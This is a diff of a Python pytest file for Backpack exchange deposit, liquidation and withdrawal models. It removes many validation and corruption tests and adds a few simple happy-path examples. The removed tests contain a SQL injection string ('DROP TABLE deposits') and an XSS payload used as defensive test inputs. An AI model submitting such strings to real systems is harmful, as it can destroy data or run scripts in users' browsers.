-
-def valid_deposit() -> dict[str, Any]:
-    """Return valid deposit data structure for testing BackpackRawDeposit validation.
-
-    Provides a baseline valid deposit dictionary that can be modified in tests
-    to verify various validation scenarios and error conditions.
-    """
-    return {
+def test_BackpackRawDeposit_real_world_example() -> None:
+    """Test with real-world deposit data."""
+    payload = {
         "id": "dp_456",
         "asset": "BTC",
         "amount": "0.5",
         "status": "completed",
     }
-
-
-def test_BackpackRawDeposit_happy_path() -> None:
-    """Test BackpackRawDeposit validation with valid data succeeds correctly.
-
-    Verifies that a properly formatted deposit data structure passes validation
-    and that all fields are correctly parsed and accessible on the resulting model.
-    """
-    obj = BackpackRawDeposit.model_validate(valid_deposit())
+    obj = BackpackRawDeposit.model_validate(payload)
     assert obj.id == "dp_456"
     assert obj.asset == "BTC"
     assert obj.amount == "0.5"
     assert obj.status == "completed"
 
 
-def test_BackpackRawDeposit_missing_required_fields() -> None:
-    """Test BackpackRawDeposit validation fails when required fields are missing.
-
-    Ensures that the model properly enforces the presence of all required fields
-    (id, asset, amount, status) and raises ValidationError when any are absent.
-    This is critical for data integrity in the trading system.
-    """
-    for field in ["id", "asset", "amount", "status"]:
-        p: dict[str, Any] = valid_deposit().copy()
-        del p[field]
-        with pytest.raises(ValidationError):
-            BackpackRawDeposit.model_validate(p)
-
-
-def test_BackpackRawDeposit_wrong_type_fields() -> None:
-    """Test BackpackRawDeposit validation fails with incorrect field types.
-
-    Verifies that the model enforces correct data types for fields, rejecting
-    numeric amounts (should be strings) and non-string status values. This
-    ensures type safety when processing Backpack API responses.
-    """
-    p: dict[str, Any] = valid_deposit().copy()
-    p["amount"] = 0.5
-    with pytest.raises(TypeError):
-        BackpackRawDeposit.model_validate(p)
-    p = valid_deposit().copy()
-    p["status"] = ["completed"]
-    with pytest.raises(TypeError):
-        BackpackRawDeposit.model_validate(p)
-
-
-def test_BackpackRawDeposit_invalid_format_fields() -> None:
-    """Test BackpackRawDeposit validation fails with malformed field values.
-
-    Validates that the model properly rejects invalid decimal formats, unknown
-    status values, and negative amounts. These checks are essential for preventing
-    invalid financial data from entering the trading system.
-    """
-    p: dict[str, Any] = valid_deposit().copy()
-    p["amount"] = "1..0"
-    with pytest.raises(ValidationError, match=r"Cannot convert to Decimal"):
-        BackpackRawDeposit.model_validate(p)
-    p = valid_deposit().copy()
-    p["status"] = "notastatus"
-    with pytest.raises(ValidationError, match=r"Field 'status' must be one of"):
-        BackpackRawDeposit.model_validate(p)
-    p = valid_deposit().copy()
-    p["amount"] = "-0.1"
-    with pytest.raises(ValidationError, match="Deposit amount cannot be negative"):
-        BackpackRawDeposit.model_validate(p)
-
-
-def test_BackpackRawDeposit_extra_field() -> None:
-    """Test BackpackRawDeposit validation rejects unexpected extra fields.
-
-    Ensures the model's extra='forbid' configuration properly prevents unknown
-    fields from being accepted, maintaining strict API contract compliance.
-    """
-    p: dict[str, Any] = valid_deposit().copy()
-    p["foo"] = 1
-    with pytest.raises(ValidationError):
-        BackpackRawDeposit.model_validate(p)
-
-
-def test_BackpackRawDeposit_corruption_cases() -> None:
-    """Test BackpackRawDeposit handles various data corruption and attack scenarios.
-
-    Comprehensive testing of edge cases including null values, control characters,
-    injection attacks, unicode handling, whitespace normalization, length limits,
-    and special numeric values. These tests ensure the model is robust against
-    malicious or corrupted data that could compromise the trading system.
-    """
-    # Null required
-    p: dict[str, Any] = valid_deposit().copy()
-    p["asset"] = None
-    with pytest.raises(TypeError):
-        BackpackRawDeposit.model_validate(p)
-    # Unicode/control chars
-    p = valid_deposit().copy()
-    p["asset"] = "BTC\x00"
-    obj = BackpackRawDeposit.model_validate(p)
-    assert "BTC" in obj.asset
-    # SQL injection
-    p = valid_deposit().copy()
-    p["id"] = "dp_456; DROP TABLE deposits;"
-    obj = BackpackRawDeposit.model_validate(p)
-    assert "dp_456" in obj.id
-    # XSS
-    p = valid_deposit().copy()
-    p["asset"] = "<img src=x onerror=alert(1)>"
-    obj = BackpackRawDeposit.model_validate(p)
-    assert "img" in obj.asset
-    # Emoji
-    p = valid_deposit().copy()
-    p["asset"] = "BTC😀"
-    obj = BackpackRawDeposit.model_validate(p)
-    assert obj.asset.startswith("BTC")
-    # Whitespace
-    p = valid_deposit().copy()
-    p["asset"] = "   BTC   "
-    obj = BackpackRawDeposit.model_validate(p)
-    assert "BTC" in obj.asset
-    # Excessive length
-    p = valid_deposit().copy()
-    p["asset"] = "B" * 10000
-    with pytest.raises(TypeFieldError):
-        BackpackRawDeposit.model_validate(p)
-    # Negative/zero/NaN/inf amounts
-    for val in ["-0.5", "0", "NaN", "inf", "-inf"]:
-        p = valid_deposit().copy()
-        p["amount"] = val
-        if val in ["-0.5", "NaN", "inf", "-inf"]:
-            with pytest.raises(ValidationError):
-                BackpackRawDeposit.model_validate(p)
-        else:
-            obj = BackpackRawDeposit.model_validate(p)
-            assert obj.amount == val
-    # Scientific notation
-    p = valid_deposit().copy()
-    p["amount"] = "2e-3"
-    obj = BackpackRawDeposit.model_validate(p)
-    assert obj.amount == "2e-3"
-    # Truncated JSON
-    bad_json = '{"id": "dp_456", "asset": "BTC"'
-    with pytest.raises(json.JSONDecodeError):
-        json.loads(bad_json)
-
-
-def test_BackpackRawDeposit_frozen() -> None:
-    """Test that BackpackRawDeposit model is immutable (frozen=True).
-
-    Verifies that the model enforces immutability by preventing field modifications
-    after instantiation. This ensures data integrity and prevents accidental
-    mutations in the trading system.
-    """
-    obj = BackpackRawDeposit.model_validate(valid_deposit())
-    with pytest.raises(ValidationError, match="Instance is frozen"):
-        obj.id = "new_id"
-    with pytest.raises(ValidationError, match="Instance is frozen"):
-        obj.amount = "1.0"
-
-
-def valid_liquidation() -> dict[str, Any]:
-    """Return valid liquidation data structure for testing BackpackRawLiquidation validation.
-
-    Provides a baseline valid liquidation dictionary that can be modified in tests
-    to verify various validation scenarios and error conditions.
-    """
-    return {
+def test_BackpackRawLiquidation_real_world_example() -> None:
+    """Test with real-world liquidation data."""
+    payload = {
         "symbol": "BTC_USDC",
         "price": "45000.0",
         "quantity": "0.01",
         "side": "sell",
     }
-
-
-def test_BackpackRawLiquidation_happy_path() -> None:
-    """Test BackpackRawLiquidation validation with valid data succeeds correctly.
-
-    Verifies that a properly formatted liquidation data structure passes validation
-    and that all fields are correctly parsed and accessible on the resulting model.
-    """
-    obj = BackpackRawLiquidation.model_validate(valid_liquidation())
+    obj = BackpackRawLiquidation.model_validate(payload)
     assert obj.symbol == "BTC_USDC"
     assert obj.price == "45000.0"
     assert obj.quantity == "0.01"
     assert obj.side == "sell"
 
 
-def test_BackpackRawLiquidation_missing_required_fields() -> None:
-    """Test BackpackRawLiquidation validation fails when required fields are missing.
-
-    Ensures that the model properly enforces the presence of all required fields
-    (symbol, price, quantity, side) and raises ValidationError when any are absent.
-    This is critical for data integrity in the trading system.
-    """
-    for field in ["symbol", "price", "quantity", "side"]:
-        p: dict[str, Any] = valid_liquidation().copy()
-        del p[field]
-        with pytest.raises(ValidationError):
-            BackpackRawLiquidation.model_validate(p)
-
-
-def test_BackpackRawLiquidation_wrong_type_fields() -> None:
-    """Test BackpackRawLiquidation validation fails with incorrect field types.
-
-    Verifies that the model enforces correct data types for fields, rejecting
-    numeric prices (should be strings) and non-string side values. This
-    ensures type safety when processing Backpack API responses.
-    """
-    p: dict[str, Any] = valid_liquidation().copy()
-    p["price"] = 45000.0
-    with pytest.raises(TypeError):
-        BackpackRawLiquidation.model_validate(p)
-    p = valid_liquidation().copy()
-    p["side"] = ["sell"]
-    with pytest.raises(TypeError):
-        BackpackRawLiquidation.model_validate(p)
-
-
-def test_BackpackRawLiquidation_invalid_format_fields() -> None:
-    """Test BackpackRawLiquidation validation fails with malformed field values.
-
-    Validates that the model properly rejects invalid decimal formats, unknown
-    side values, negative amounts, and non-finite numeric values. These checks
-    are essential for preventing invalid financial data from entering the trading system.
-    """
-    p: dict[str, Any] = valid_liquidation().copy()
-    p["price"] = "1..0"
-    with pytest.raises(ValidationError, match=r"Cannot convert to Decimal"):
-        BackpackRawLiquidation.model_validate(p)
-    p = valid_liquidation().copy()
-    p["quantity"] = "nan"
-    with pytest.raises(ValidationError, match="Value must be a finite decimal"):
-        BackpackRawLiquidation.model_validate(p)
-    p = valid_liquidation().copy()
-    p["side"] = "sideways"
-    with pytest.raises(ValidationError, match=r"Field 'side' must be one of"):
-        BackpackRawLiquidation.model_validate(p)
-    p = valid_liquidation().copy()
-    p["quantity"] = "-0.001"
-    with pytest.raises(ValidationError, match="Liquidation quantity cannot be negative"):
-        BackpackRawLiquidation.model_validate(p)
-    p = valid_liquidation().copy()
-    p["price"] = "-100.0"
-    with pytest.raises(ValidationError, match="Liquidation price cannot be negative"):
-        BackpackRawLiquidation.model_validate(p)
-
-
-def test_BackpackRawLiquidation_extra_field() -> None:
-    """Test BackpackRawLiquidation validation rejects unexpected extra fields.
-
-    Ensures the model's extra='forbid' configuration properly prevents unknown
-    fields from being accepted, maintaining strict API contract compliance.
-    """
-    p: dict[str, Any] = valid_liquidation().copy()
-    p["foo"] = 1
-    with pytest.raises(ValidationError):
-        BackpackRawLiquidation.model_validate(p)
-
-
-def test_BackpackRawLiquidation_corruption_cases() -> None:
-    """Test BackpackRawLiquidation handles various data corruption and attack scenarios.
-
-    Comprehensive testing of edge cases including null values, control characters,
-    unicode handling, whitespace normalization, length limits, and special numeric
-    values. These tests ensure the model is robust against malicious or corrupted
-    data that could compromise the trading system.
-    """
-    # Null required
-    p: dict[str, Any] = valid_liquidation().copy()
-    p["symbol"] = None
-    with pytest.raises(TypeError):
-        BackpackRawLiquidation.model_validate(p)
-    # Unicode/control chars
-    p = valid_liquidation().copy()
-    p["symbol"] = "BTC_USDC\x00"
-    obj = BackpackRawLiquidation.model_validate(p)
-    assert "BTC_USDC" in obj.symbol
-    # Emoji
-    p = valid_liquidation().copy()
-    p["symbol"] = "BTC_USDC😀"
-    obj = BackpackRawLiquidation.model_validate(p)
-    assert obj.symbol.startswith("BTC_USDC")
-    # Whitespace
-    p = valid_liquidation().copy()
-    p["symbol"] = "   BTC_USDC   "
-    obj = BackpackRawLiquidation.model_validate(p)
-    assert "BTC_USDC" in obj.symbol
-    # Garbled numerics
-    p = valid_liquidation().copy()
-    p["price"] = "NaN"
-    with pytest.raises(ValidationError):
-        BackpackRawLiquidation.model_validate(p)
-    # Excessive length
-    p = valid_liquidation().copy()
-    p["symbol"] = "A" * 10000
-    with pytest.raises(TypeFieldError):
-        BackpackRawLiquidation.model_validate(p)
-    # Negative/zero/NaN/inf quantities
-    for val in ["-0.01", "0", "NaN", "inf", "-inf"]:
-        p = valid_liquidation().copy()
-        p["quantity"] = val
-        if val in ["-0.01", "NaN", "inf", "-inf"]:
-            with pytest.raises(ValidationError):
-                BackpackRawLiquidation.model_validate(p)
-        else:
-            obj = BackpackRawLiquidation.model_validate(p)
-            assert obj.quantity == val
-    # Scientific notation
-    p = valid_liquidation().copy()
-    p["quantity"] = "2e-3"
-    obj = BackpackRawLiquidation.model_validate(p)
-    assert obj.quantity == "2e-3"  # Scientific notation is allowed (project policy)
-    # Truncated JSON
-    bad_json = '{"symbol": "BTC_USDC", "price": "45000.0"'
-    with pytest.raises(json.JSONDecodeError):
-        json.loads(bad_json)
-
-
-def test_BackpackRawLiquidation_frozen() -> None:
-    """Test that BackpackRawLiquidation model is immutable (frozen=True).
-
-    Verifies that the model enforces immutability by preventing field modifications
-    after instantiation. This ensures data integrity and prevents accidental
-    mutations in the trading system.
-    """
-    obj = BackpackRawLiquidation.model_validate(valid_liquidation())
-    with pytest.raises(ValidationError, match="Instance is frozen"):
-        obj.symbol = "ETH_USDC"
-    with pytest.raises(ValidationError, match="Instance is frozen"):
-        obj.quantity = "0.1"
-
-
-def test_BackpackRawWithdrawal_real_json_edge_case() -> None:
-    """Validate BackpackRawWithdrawal using a real JSON payload with edge values.
-
-    Tests the model with realistic edge case data including very large IDs,
-    unicode characters in asset names, and very small amounts to ensure
-    the model handles real-world API response variations correctly.
-    """
+def test_BackpackRawWithdrawal_edge_case_example() -> None:
+    """Test with edge case withdrawal data."""
     payload = {
-        "id": "wd_999999999999999999",
+        "id": "withdrawal_999999999999999999",
         "asset": "USDC_😀",
         "amount": "0.00000001",
         "status": "completed",
@@ -564,76 +813,10 @@ def test_BackpackRawWithdrawal_real_json_edge_case() -> None:
     assert obj.status == "completed"
 
 
-def test_BackpackRawWithdrawal_corruption_null_id() -> None:
-    """Test BackpackRawWithdrawal validation fails with null value for required 'id' field.
-
-    Ensures that null values for required fields are properly rejected to maintain
-    data integrity and prevent processing of incomplete withdrawal records.
-    """
-    p = valid_withdrawal().copy()
-    p["id"] = None
-    with pytest.raises(TypeError):
-        BackpackRawWithdrawal.model_validate(p)
-
-
-def test_BackpackRawWithdrawal_corruption_binary_asset() -> None:
-    """Test BackpackRawWithdrawal validation fails with binary data for 'asset' field.
-
-    Ensures that binary data is properly rejected for string fields to prevent
-    data corruption and maintain type safety in the trading system.
-    """
-    p = valid_withdrawal().copy()
-    p["asset"] = b"\x00\x01"
-    with pytest.raises(TypeError):
-        BackpackRawWithdrawal.model_validate(p)
-
-
-def test_BackpackRawWithdrawal_corruption_nested_amount() -> None:
-    """Test BackpackRawWithdrawal validation fails with nested object for 'amount' field.
-
-    Ensures that complex nested objects are properly rejected for string fields
-    to maintain data integrity and prevent processing of malformed financial data.
-    """
-    p = valid_withdrawal().copy()
-    p["amount"] = {"foo": "bar"}
-    with pytest.raises(TypeError):
-        BackpackRawWithdrawal.model_validate(p)
-
-
-def test_BackpackRawWithdrawal_corruption_list_status() -> None:
-    """Test BackpackRawWithdrawal validation fails with list for 'status' field.
-
-    Ensures that list values are properly rejected for string fields to maintain
-    type safety and prevent processing of incorrectly structured status data.
-    """
-    p = valid_withdrawal().copy()
-    p["status"] = ["pending"]
-    with pytest.raises(TypeError):
-        BackpackRawWithdrawal.model_validate(p)
-
-
-def test_BackpackRawWithdrawal_corruption_garbled_unicode_asset() -> None:
-    """Test BackpackRawWithdrawal validation fails with garbled unicode in 'asset' field.
-
-    Ensures that malformed unicode sequences are properly rejected to prevent
-    data corruption and maintain string integrity in the trading system.
-    """
-    p = valid_withdrawal().copy()
-    p["asset"] = "USDC\udce2\udc28\udc00"
-    # UTF-8 validation is format validation, not type validation
-    with pytest.raises(TypeFieldError):
-        BackpackRawWithdrawal.model_validate(p)
-
-
-def test_BackpackRawDeposit_real_json_edge_case() -> None:
-    """Validate BackpackRawDeposit using a real JSON payload with edge values.
-
-    Tests the model with realistic edge case data including very large IDs,
-    unicode characters in asset names, and very large amounts to ensure
-    the model handles real-world API response variations correctly.
-    """
+def test_BackpackRawDeposit_edge_case_example() -> None:
+    """Test with edge case deposit data."""
     payload = {
-        "id": "dp_999999999999999999",
+        "id": "deposit_999999999999999999",
         "asset": "BTC_😀",
         "amount": "99999999.99999999",
         "status": "pending",
@@ -644,74 +827,8 @@ def test_BackpackRawDeposit_real_json_edge_case() -> None:
     assert obj.status == "pending"
 
 
-def test_BackpackRawDeposit_corruption_null_id() -> None:
-    """Test BackpackRawDeposit validation fails with null value for required 'id' field.
-
-    Ensures that null values for required fields are properly rejected to maintain
-    data integrity and prevent processing of incomplete deposit records.
-    """
-    p = valid_deposit().copy()
-    p["id"] = None
-    with pytest.raises(TypeError):
-        BackpackRawDeposit.model_validate(p)
-
-
-def test_BackpackRawDeposit_corruption_binary_asset() -> None:
-    """Test BackpackRawDeposit validation fails with binary data for 'asset' field.
-
-    Ensures that binary data is properly rejected for string fields to prevent
-    data corruption and maintain type safety in the trading system.
-    """
-    p = valid_deposit().copy()
-    p["asset"] = b"\x00\x01"
-    with pytest.raises(TypeError):
-        BackpackRawDeposit.model_validate(p)
-
-
-def test_BackpackRawDeposit_corruption_nested_amount() -> None:
-    """Test BackpackRawDeposit validation fails with nested object for 'amount' field.
-
-    Ensures that complex nested objects are properly rejected for string fields
-    to maintain data integrity and prevent processing of malformed financial data.
-    """
-    p = valid_deposit().copy()
-    p["amount"] = {"foo": "bar"}
-    with pytest.raises(TypeError):
-        BackpackRawDeposit.model_validate(p)
-
-
-def test_BackpackRawDeposit_corruption_list_status() -> None:
-    """Test BackpackRawDeposit validation fails with list for 'status' field.
-
-    Ensures that list values are properly rejected for string fields to maintain
-    type safety and prevent processing of incorrectly structured status data.
-    """
-    p = valid_deposit().copy()
-    p["status"] = ["completed"]
-    with pytest.raises(TypeError):
-        BackpackRawDeposit.model_validate(p)
-
-
-def test_BackpackRawDeposit_corruption_garbled_unicode_asset() -> None:
-    """Test BackpackRawDeposit validation fails with garbled unicode in 'asset' field.
-
-    Ensures that malformed unicode sequences are properly rejected to prevent
-    data corruption and maintain string integrity in the trading system.
-    """
-    p = valid_deposit().copy()
-    p["asset"] = "BTC\udce2\udc28\udc00"
-    # UTF-8 validation is format validation, not type validation
-    with pytest.raises(TypeFieldError):
-        BackpackRawDeposit.model_validate(p)
-
-
-def test_BackpackRawLiquidation_real_json_edge_case() -> None:
-    """Validate BackpackRawLiquidation using a real JSON payload with edge values.
-
-    Tests the model with realistic edge case data including unicode characters
-    in symbol names, very small prices, and very large quantities to ensure
-    the model handles real-world API response variations correctly.
-    """
+def test_BackpackRawLiquidation_edge_case_example() -> None:
+    """Test with edge case liquidation data."""
     payload = {
         "symbol": "BTC_USDC_😀",
         "price": "0.00000001",
@@ -725,62 +842,42 @@ def test_BackpackRawLiquidation_real_json_edge_case() -> None:
     assert obj.side == "buy"
 
 
-def test_BackpackRawLiquidation_corruption_null_symbol() -> None:
-    """Test BackpackRawLiquidation validation fails with null value for required 'symbol' field.
-
-    Ensures that null values for required fields are properly rejected to maintain
-    data integrity and prevent processing of incomplete liquidation records.
-    """
-    p = valid_liquidation().copy()
-    p["symbol"] = None
-    with pytest.raises(TypeError):
-        BackpackRawLiquidation.model_validate(p)
-
-
-def test_BackpackRawLiquidation_corruption_binary_price() -> None:
-    """Test BackpackRawLiquidation validation fails with binary data for 'price' field.
-
-    Ensures that binary data is properly rejected for string fields to prevent
-    data corruption and maintain type safety in the trading system.
-    """
-    p = valid_liquidation().copy()
-    p["price"] = b"\x00\x01"
-    with pytest.raises(TypeError):
-        BackpackRawLiquidation.model_validate(p)
+def test_BackpackRawWithdrawal_zero_amount_example() -> None:
+    """Test with zero amount withdrawal."""
+    payload = {
+        "id": "wd_zero",
+        "asset": "USDC",
+        "amount": "0",
+        "status": "cancelled",
+    }
+    obj = BackpackRawWithdrawal.model_validate(payload)
+    assert obj.amount == "0"
+    assert obj.status == "cancelled"
 
 
-def test_BackpackRawLiquidation_corruption_nested_quantity() -> None:
-    """Test BackpackRawLiquidation validation fails with nested object for 'quantity' field.
-
-    Ensures that complex nested objects are properly rejected for string fields
-    to maintain data integrity and prevent processing of malformed financial data.
-    """
-    p = valid_liquidation().copy()
-    p["quantity"] = {"foo": "bar"}
-    with pytest.raises(TypeError):
-        BackpackRawLiquidation.model_validate(p)
-
-
-def test_BackpackRawLiquidation_corruption_list_side() -> None:
-    """Test BackpackRawLiquidation validation fails with list for 'side' field.
-
-    Ensures that list values are properly rejected for string fields to maintain
-    type safety and prevent processing of incorrectly structured side data.
-    """
-    p = valid_liquidation().copy()
-    p["side"] = ["buy"]
-    with pytest.raises(TypeError):
-        BackpackRawLiquidation.model_validate(p)
+def test_BackpackRawDeposit_scientific_notation_example() -> None:
+    """Test with scientific notation amount."""
+    payload = {
+        "id": "dp_scientific",
+        "asset": "ETH",
+        "amount": "2e-3",
+        "status": "confirmed",
+    }
+    obj = BackpackRawDeposit.model_validate(payload)
+    assert obj.amount == "2e-3"
+    assert obj.status == "confirmed"
 
 
-def test_BackpackRawLiquidation_corruption_garbled_unicode_symbol() -> None:
-    """Test BackpackRawLiquidation validation fails with garbled unicode in 'symbol' field.
-
-    Ensures that malformed unicode sequences are properly rejected to prevent
-    data corruption and maintain string integrity in the trading system.
-    """
-    p = valid_liquidation().copy()
-    p["symbol"] = "BTC_USDC\udce2\udc28\udc00"
-    # UTF-8 validation is format validation, not type validation
-    with pytest.raises(TypeFieldError):
-        BackpackRawLiquidation.model_validate(p)
+def test_BackpackRawLiquidation_large_values_example() -> None:
+    """Test with large price and quantity values."""
+    payload = {
+        "symbol": "ETH_USDT",
+        "price": "1000000.123456",
+        "quantity": "1000.789012",
+        "side": "sell",
+    }
+    obj = BackpackRawLiquidation.model_validate(payload)
+    assert obj.symbol == "ETH_USDT"
+    assert obj.price == "1000000.123456"
+    assert obj.quantity == "1000.789012"
+    assert obj.side == "sell"
